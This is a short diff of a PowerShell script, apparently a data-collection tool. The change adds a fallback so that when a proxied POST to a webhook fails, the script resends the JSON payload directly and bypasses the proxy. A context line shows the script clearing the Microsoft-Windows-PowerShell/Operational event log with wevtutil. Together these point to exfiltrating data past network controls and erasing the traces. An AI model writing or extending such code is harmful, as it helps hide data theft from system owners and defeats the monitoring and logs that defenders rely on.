@@ -36,12 +36,21 @@ function Send-Webhook-Data {
 
     $body = $Payload | ConvertTo-Json -Depth 5
 
-    Invoke-RestMethod `
+    try {
+        Invoke-RestMethod `
         -Uri $webhookUrl `
         -Method Post `
         -Body $body `
         -ContentType "application/json; charset=utf-8" `
         -Proxy $proxy
+    } catch {
+        Write-Host "Proxy not allowed" -ForegroundColor Red
+        Invoke-RestMethod `
+        -Uri $webhookUrl `
+        -Method Post `
+        -Body $body `
+        -ContentType "application/json; charset=utf-8" `
+    }
 }
 
 
@@ -595,6 +604,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
